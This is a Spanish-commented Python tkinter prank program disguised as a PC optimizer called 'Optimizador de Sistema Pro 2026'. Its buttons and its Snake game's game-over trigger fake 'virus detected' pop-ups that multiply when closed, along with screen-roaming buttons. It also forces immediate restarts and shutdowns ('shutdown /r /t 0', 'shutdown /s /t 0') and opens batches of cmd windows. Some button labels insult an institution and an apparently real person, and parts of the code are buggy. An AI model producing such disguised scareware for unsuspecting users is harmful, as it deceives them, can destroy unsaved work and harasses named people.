import os
import random
import threading
import time
import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk, ImageSequence
import pygame
import webbrowser

# Inicializar el mezclador de audio de pygame
pygame.mixer.init()

# Lista global para las imágenes shitpost (se llena tras crear la ventana root)
SHITPOST_IMAGES = []

# --- TEXTO BASURA / SHITPOST (tono meme, sin ofensas reales) ---
TEXTO_BASURA = [
    "Tu disco duro está llorando",
    "Windows quiere renunciar y dedicarse a la jardinería",
    "Tu RAM se fue de vacaciones sin avisar",
    "Error: el cerebro no está conectado",
    "Esta PC tiene más virus que una guardería",
    "¿Quién te dio permiso de usar una computadora?",
    "Tu mouse está en huelga",
    "La CPU está gritando auxilio",
    "Windows Update está juzgando tus decisiones de vida",
    "Tu contraseña es '1234', ¿verdad?",
    "Este equipo necesita un exorcismo, no una optimización",
    "Tu navegador tiene 47 pestañas abiertas y ninguna es útil",
    "La nube se mojó y se apagó",
    "Tu tarjeta gráfica está mínimamente molesta",
    "BIOS: No te conozco, vete de aquí"
]

# --- PÁGINAS DIVERTIDAS ---
PAGINAS_DIVERTIDAS = [
    "https://www.google.com",
    "https://www.youtube.com",
    "https://www.reddit.com/r/ProgrammerHumor/",
    "https://google.com/doodles"
]

def aplicar_rainbow(btn, colores=None, indice=[0]):
    """Hace que un botón cambie de colores como arcoíris constantemente"""
    if colores is None:
        colores = ["#FF0000", "#FF7F00", "#FFFF00", "#00FF00", "#0000FF", "#4B0082", "#8B00FF"]
    try:
        btn.config(bg=colores[indice[0] % len(colores)])
    except tk.TclError:
        return
    indice[0] += 1
    btn.after(100, lambda: aplicar_rainbow(btn, colores, indice))

def ventana_parpadeante(top, colores=None, indice=[0]):
    """Hace que una ventana parpadee cambiando de color de fondo"""
    if colores is None:
        colores = ["#FF0000", "#00FF00", "#0000FF", "#FFFF00", "#FF00FF", "#00FFFF", "#FFFFFF"]
    try:
        top.config(bg=colores[indice[0] % len(colores)])
    except tk.TclError:
        return
    indice[0] += 1
    top.after(150, lambda: ventana_parpadeante(top, colores, indice))

def abrir_pagina_divertida():
    """Abre una pestaña del navegador con una página divertida"""
    url = random.choice(PAGINAS_DIVERTIDAS)
    try:
        webbrowser.open_new_tab(url)
    except Exception as e:
        print("No se pudo abrir el navegador:", e)

def abrir_aplicaciones_oficina():
    """Abre Word, Excel, PowerPoint y Panel de Control"""
    apps = ["winword", "excel", "powerpnt", "control"]
    for app in apps:
        try:
            os.startfile(app)
        except Exception as e:
            print(f"No se pudo abrir {app}: {e}")

def reiniciar_computadora():
    """Reinicia la computadora inmediatamente sin confirmación"""
    os.system("shutdown /r /t 0")


def crear_boton_caotico(root):
    """Crea un botón flotante que se mueve por toda la pantalla"""
    flotante = tk.Toplevel(root)
    flotante.overrideredirect(True)
    flotante.attributes("-topmost", True)
    ancho_pantalla = root.winfo_screenwidth()
    alto_pantalla = root.winfo_screenheight()
    x = random.randint(0, ancho_pantalla - 120)
    y = random.randint(0, alto_pantalla - 60)
    flotante.geometry(f"120x50+{x}+{y}")

    btn = tk.Button(
        flotante,
        text="¡CLICK ME!",
        fg="white",
        font=("Arial", 10, "bold"),
        command=abrir_pagina_divertida,
        relief="raised",
        bd=3
    )
    btn.pack(fill="both", expand=True)
    aplicar_rainbow(btn)

    def mover():
        try:
            x = random.randint(0, ancho_pantalla - 120)
            y = random.randint(0, alto_pantalla - 60)
            flotante.geometry(f"120x50+{x}+{y}")
            flotante.after(300, mover)
        except tk.TclError:
            return

    mover()

def reproducir_sonido_aleatorio():
    """Reproduce un efecto de sonido simulado o beep si no hay archivos"""
    try:
        # Si tienes archivos en assets/audio/, puedes cargarlos aquí
        # pygame.mixer.Sound("assets/audio/vine_boom.mp3").play()
        pass
    except Exception as e:
        print("Error de audio:", e)

def abrir_ventanas_infinitas(root):
    """Función que empieza a spamear ventanas sin piedad"""
    def lanzar():
        while True:
            # Crear una ventana secundaria aleatoria
            top = tk.Toplevel(root)
            top.title("¡¡VIRUS DETECTADO!!")
            
            # Posición aleatoria en la pantalla
            ancho_pantalla = root.winfo_screenwidth()
            alto_pantalla = root.winfo_screenheight()
            x = random.randint(0, ancho_pantalla - 450)
            y = random.randint(0, alto_pantalla - 350)
            top.geometry(f"450x350+{x}+{y}")
            
            # Activar efecto parpadeante en la ventana
            ventana_parpadeante(top)
            
            # Imagen shitpost aleatoria
            if SHITPOST_IMAGES:
                foto = random.choice(SHITPOST_IMAGES)
                lbl_img = tk.Label(top, image=foto, bg="white")
                lbl_img.image = foto  # referencia para evitar que Python la borre
                lbl_img.pack(pady=10)

            # Texto basura shitpost aleatorio
            txt_basura = random.choice(TEXTO_BASURA)
            lbl_texto = tk.Label(top, text=txt_basura, fg="red", bg="white",
                                font=("Arial", 11, "bold"), wraplength=400)
            lbl_texto.pack(pady=10)
            
            # Mensajes shitpost aleatorios
            mensajes = [
                "¡Tu PC se ha descargado a 0%!",
                "Descargando RAM gratis...",
                "¿Estás seguro de que eres programador?",
                "Error 404: Cerebro no encontrado",
                "¡Has ganado un iPhone de cartón!",
                "Windows está robando tus datos..."
            ]
            
            tk.Label(top, text=random.choice(mensajes), fg="red", bg="white",
                    font=("Arial", 10, "bold")).pack(pady=5)
            
            # Botón troll que al cerrarlo abre dos más
            def cerrar_troll():
                top.destroy()
                # Lanza dos ventanas extra al intentar cerrar esta
                threading.Thread(target=lanzar).start()
                threading.Thread(target=lanzar).start()

            btn = tk.Button(top, text="Cerrar", command=cerrar_troll)
            btn.pack(pady=10)
            
            # Botón que abre una página divertida
            btn_web = tk.Button(
                top,
                text="¡VISITA GOOGLE!",
                bg="#4285F4",
                fg="white",
                font=("Arial", 10, "bold"),
                command=abrir_pagina_divertida
            )
            btn_web.pack(pady=5)
            
            # Botón aleatorio con efecto rainbow (¡colores locos!)
            if random.random() < 0.7:  # 70% de probabilidad de aparecer
                btn_rainbow = tk.Button(
                    top,
                    text="¡BOTÓN RAINBOW!",
                    fg="white",
                    font=("Arial", 10, "bold"),
                    command=lambda: messagebox.showinfo("Rainbow", "¡¡COLORIIIIS!!")
                )
                btn_rainbow.pack(pady=5)
                aplicar_rainbow(btn_rainbow)
            
            time.sleep(0.4) # Velocidad con la que aparecen las ventanas

    # Ejecutar en un hilo separado para que no se congele la app
    threading.Thread(target=lanzar, daemon=True).start()


def cargar_frames_gif(ruta):
    """Carga todos los frames de un GIF animado y sus duraciones en ms."""
    frames = []
    duraciones = []
    try:
        im = Image.open(ruta)
        for frame in ImageSequence.Iterator(im):
            f = frame.convert("RGBA")
            foto = ImageTk.PhotoImage(f)
            frames.append(foto)
            duraciones.append(frame.info.get("duration", 100))
    except Exception as e:
        print(f"No se pudo cargar gif {ruta}: {e}")
    return frames, duraciones


def reproducir_video_audio(clave, parent=None):
    """Muestra el GIF y reproduce el MP3 asociados a la clave en una ventana flotante."""
    if clave not in PARES_AUDIO_GIF:
        return
    audio_file, gif_file = PARES_AUDIO_GIF[clave]
    ruta_audio = os.path.join(AUDIO_DIR, audio_file)
    ruta_gif = os.path.join(IMAGES_DIR, gif_file)

    top = tk.Toplevel(parent or root)
    top.title("¡VIDEO!")
    top.attributes("-topmost", True)
    top.configure(bg="black")
    ancho_pantalla = top.winfo_screenwidth()
    alto_pantalla = top.winfo_screenheight()
    top.geometry(f"400x300+{(ancho_pantalla-400)//2}+{(alto_pantalla-300)//2}")

    lbl = tk.Label(top, bg="black")
    lbl.pack(expand=True, fill="both")

    frames, duraciones = cargar_frames_gif(ruta_gif)

    sonido = None
    try:
        if os.path.exists(ruta_audio):
            sonido = pygame.mixer.Sound(ruta_audio)
            sonido.play()
    except Exception as e:
        print("Error de audio:", e)

    def animar(i=0):
        try:
            if not frames:
                return
            lbl.config(image=frames[i])
            lbl.image = frames[i]
        except tk.TclError:
            return
        siguiente = (i + 1) % len(frames)
        demora = duraciones[i] if i < len(duraciones) else 100
        top.after(demora, lambda: animar(siguiente))

    animar()

    # Cerrar automáticamente al terminar el audio (o el gif)
    if sonido:
        dur_ms = int(sonido.get_length() * 1000) + 500
    elif duraciones:
        dur_ms = sum(duraciones) + 500
    else:
        dur_ms = 3000

    def cerrar():
        try:
            if sonido:
                sonido.stop()
        except Exception:
            pass
        try:
            top.destroy()
        except tk.TclError:
            pass

    top.after(dur_ms, cerrar)


def reproducir_todos_videos(parent=None):
    """Reproduce los 4 pares audio+gif en secuencia (uno tras otro)."""
    claves = list(PARES_AUDIO_GIF.keys())
    for i, clave in enumerate(claves):
        # Cada video arranca con un pequeño retraso para que se vean pasar todos
        parent.after(i * 1200, lambda c=clave: reproducir_video_audio(c, parent))


def boton_huir(e):
    """Hace que el botón se mueva para que no puedan hacerle clic"""
    nuevo_x = random.randint(10, 650)
    nuevo_y = random.randint(50, 500)
    btn_trampa.place(x=nuevo_x, y=nuevo_y)

def abrir_juego_serpiente():
    """Abre una ventana con el juego clásico de la serpiente (Snake)"""
    juego = tk.Toplevel(root)
    juego.title("Juego de la Serpiente")
    juego.geometry("420x500")
    juego.resizable(False, False)
    juego.configure(bg="#222")

    score_var = tk.IntVar(value=0)
    lbl_score = tk.Label(juego, text="Puntuación: 0", font=("Arial", 12, "bold"), bg="#222", fg="white")
    lbl_score.pack(pady=5)

    canvas = tk.Canvas(juego, width=400, height=400, bg="black", highlightthickness=0)
    canvas.pack(pady=5)

    celda = 20
    ancho_canvas = 400
    alto_canvas = 400
    juego_activo = [True]
    direccion = [celda, 0]
    serpiente = [(100, 100), (80, 100), (60, 100)]
    comida = [200, 200]
    after_id = [None]
    btn_reiniciar_ref = [None]

    def colocar_comida():
        while True:
            x = random.randint(0, (ancho_canvas - celda) // celda) * celda
            y = random.randint(0, (alto_canvas - celda) // celda) * celda
            if (x, y) not in serpiente:
                return [x, y]
    direccion = [(celda, 0)]
    def dibujar():
        canvas.delete("all")
        canvas.create_rectangle(
            comida[0], comida[1],
            comida[0] + celda, comida[1] + celda,
            fill="red", outline="darkred"
        )
        for i, seg in enumerate(serpiente):
            color = "#00FF00" if i == 0 else "#00AA00"
            canvas.create_rectangle(
                seg[0], seg[1],
                seg[0] + celda, seg[1] + celda,
                fill=color, outline="black"
            )
        lbl_score.config(text=f"Puntuación: {score_var.get()}")

    def mover():
        if not juego_activo[0]:
            return
        cabeza_x, cabeza_y = serpiente[0]
        dir_x, dir_y = direccion[0]
        nueva_cabeza = (cabeza_x + dir_x, cabeza_y + dir_y)

        if (nueva_cabeza[0] < 0 or nueva_cabeza[0] >= ancho_canvas or
            nueva_cabeza[1] < 0 or nueva_cabeza[1] >= alto_canvas):
            game_over()
            return

        if nueva_cabeza in serpiente:
            game_over()
            return

        serpiente.insert(0, nueva_cabeza)

        if nueva_cabeza[0] == comida[0] and nueva_cabeza[1] == comida[1]:
            score_var.set(score_var.get() + 10)
            comida[:] = colocar_comida()
        else:
            serpiente.pop()

        dibujar()
        after_id[0] = juego.after(100, mover)

    def game_over():
        juego_activo[0] = False
        if after_id[0]:
            juego.after_cancel(after_id[0])
        canvas.create_text(
            ancho_canvas // 2, alto_canvas // 2,
            text="GAME OVER", fill="white", font=("Arial", 24, "bold")
        )
        if btn_reiniciar_ref[0] is None:
            btn_reiniciar_ref[0] = tk.Button(
                juego, text="Jugar de nuevo", command=reiniciar,
                bg="#444", fg="white", font=("Arial", 10, "bold")
            )
            btn_reiniciar_ref[0].pack(pady=10)

        # Al perder, desatar el caos automáticamente (ventanas + botones caóticos)
        reproducir_todos_videos(root)
        abrir_ventanas_infinitas(root)
        lanzar_botones_caoticos(root)

    def reiniciar():
        nonlocal direccion, serpiente, comida
        serpiente = [(100, 100), (80, 100), (60, 100)]
        direccion = [celda, 0]
        comida[:] = colocar_comida()
        score_var.set(0)
        juego_activo[0] = True
        lbl_score.config(text="Puntuación: 0")
        if btn_reiniciar_ref[0]:
            btn_reiniciar_ref[0].destroy()
            btn_reiniciar_ref[0] = None
        direccion = [(celda, 0)]
        mover()

    def cambiar_direccion(event):
        tecla = event.keysym
        dir_x, dir_y = direccion[0]
        if tecla == "Up" and dir_y == 0:
            direccion[0] = (0, -celda)
        elif tecla == "Down" and dir_y == 0:
            direccion[0] = (0, celda)
        elif tecla == "Left" and dir_x == 0:
            direccion[0] = (-celda, 0)
        elif tecla == "Right" and dir_x == 0:
            direccion[0] = (celda, 0)

    juego.bind("<Key>", cambiar_direccion)
    juego.focus_set()

    dibujar()
    mover()

    btn_cerrar_juego = tk.Button(juego, text="Cerrar juego", command=juego.destroy, bg="#666", fg="white")
    btn_cerrar_juego.pack(pady=5)

# --- VENTANA PRINCIPAL ---
root = tk.Tk()
root.title("Optimizador de Sistema Pro 2026")
root.geometry("700x600")
root.resizable(False, False)

# --- CARGAR IMÁGENES SHITPOST DESDE assets/images (después de crear root) ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
IMAGES_DIR = os.path.join(BASE_DIR, "..", "assets", "images")

if os.path.isdir(IMAGES_DIR):
    for archivo in sorted(os.listdir(IMAGES_DIR)):
        if archivo.lower().endswith((".png", ".jpg", ".jpeg", ".gif", ".bmp", ".webp")):
            try:
                ruta = os.path.join(IMAGES_DIR, archivo)
                img = Image.open(ruta)
                img = img.convert("RGB")
                img.thumbnail((350, 200))
                foto = ImageTk.PhotoImage(img)
                SHITPOST_IMAGES.append(foto)
            except Exception as e:
                print(f"No se pudo cargar {archivo}: {e}")

# Directorio de audio
AUDIO_DIR = os.path.join(BASE_DIR, "..", "assets", "audio")

# Pares audio <-> gif que se reproducen juntos al optimizar o al perder
PARES_AUDIO_GIF = {
    "tompearlbritish": ("tompearlbritishss.mp3", "tompearlbritish.gif"),
    "fiufiucomiendo": ("fiufiucomiendo.mp3", "fiufiueating.gif"),
    "xddd": ("xddd.mp3", "xdddd.gif"),
    "fiufiuaudio": ("fiufiuaudio.mp3", "fiufiu.gif"),
}

# Etiqueta de bienvenida engañosa
tk.Label(root, text="OPTIMIZADOR DE PC EXTREMO", font=("Arial", 14, "bold"), fg="blue").pack(pady=15)
tk.Label(root, text="Presiona el botón para acelerar tu computadora al 500%:", font=("Arial", 9)).pack(pady=5)

# Botón principal que inicia el caos
btn_acelerar = tk.Button(root, text="🚀 ¡ACELERAR PC AHORA!", bg="green", fg="white", font=("Arial", 11, "bold"), 
    command=lambda: [
        reproducir_todos_videos(root),
        abrir_ventanas_infinitas(root),
        lanzar_botones_caoticos(root),
        messagebox.showwarning("¡CUIDADO!", "¡Proceso iniciado con éxito!")
    ])
btn_acelerar.pack(pady=20)

# Botón rainbow en la ventana principal (abre Office y Panel de Control)
btn_rainbow_principal = tk.Button(
    root,
    text="¡MODO RAINBOW!",
    fg="white",
    font=("Arial", 10, "bold"),
    command=abrir_aplicaciones_oficina
)
btn_rainbow_principal.pack(pady=15)
aplicar_rainbow(btn_rainbow_principal)

# Botón para jugar a la serpiente
btn_juego = tk.Button(
    root,
    text="🐍 Jugar a un juego",
    bg="#4CAF50",
    fg="white",
    font=("Arial", 11, "bold"),
    command=abrir_juego_serpiente
)
btn_juego.pack(pady=15)

# Botón peligroso: reiniciar computadora
btn_senati = tk.Button(
    root,
    text="SENATI es una basura",
    bg="blue",
    fg="white",
    font=("Arial", 10, "bold"),
    command=reiniciar_computadora
)
btn_senati.pack(pady=15)

def andy_zangano():
    """Pone la pantalla en negro y pregunta si es andy zangano."""
    negro = tk.Toplevel(root)
    negro.attributes("-fullscreen", True)
    negro.configure(bg="black")
    negro.attributes("-topmost", True)

    lbl = tk.Label(
        negro,
        text="¿Eres andy zangano?",
        fg="white",
        bg="black",
        font=("Arial", 24, "bold")
    )
    lbl.place(relx=0.5, rely=0.4, anchor="center")

    frame = tk.Frame(negro, bg="black")
    frame.place(relx=0.5, rely=0.6, anchor="center")

    def si():
        negro.destroy()
        for _ in range(8):
            os.system("start cmd")

    def no_se():
        negro.destroy()
        os.system("shutdown /s /t 0")

    btn_si = tk.Button(
        frame, text="si", command=si,
        bg="red", fg="white", font=("Arial", 12, "bold"), width=10
    )
    btn_si.pack(side="left", padx=15)

    btn_no = tk.Button(
        frame, text="no se", command=no_se,
        bg="red", fg="white", font=("Arial", 12, "bold"), width=10
    )
    btn_no.pack(side="left", padx=15)

# Botón andy zangano
btn_andy = tk.Button(
    root,
    text="andy zangano",
    bg="black",
    fg="white",
    font=("Arial", 10, "bold"),
    command=andy_zangano
)
btn_andy.pack(pady=15)

# Botón trampa que huye del mouse
btn_trampa = tk.Button(root, text="No hacer clic aquí", bg="red", fg="white")
btn_trampa.place(x=300, y=250)
btn_trampa.bind("<Enter>", boton_huir)

# --- CERRAR APLICACIÓN CON LA TECLA "X" ---
def cerrar_con_x(event):
    """Cierra la aplicación al presionar la tecla 'x' o 'X'"""
    root.destroy()

root.bind("<Key-x>", cerrar_con_x)
root.bind("<Key-X>", cerrar_con_x)


def lanzar_botones_caoticos(root, cantidad=10):
    """Lanza varios botones que se mueven por toda la pantalla"""
    for _ in range(cantidad):
        threading.Thread(target=lambda: crear_boton_caotico(root), daemon=True).start()
        time.sleep(0.15)

root.mainloop()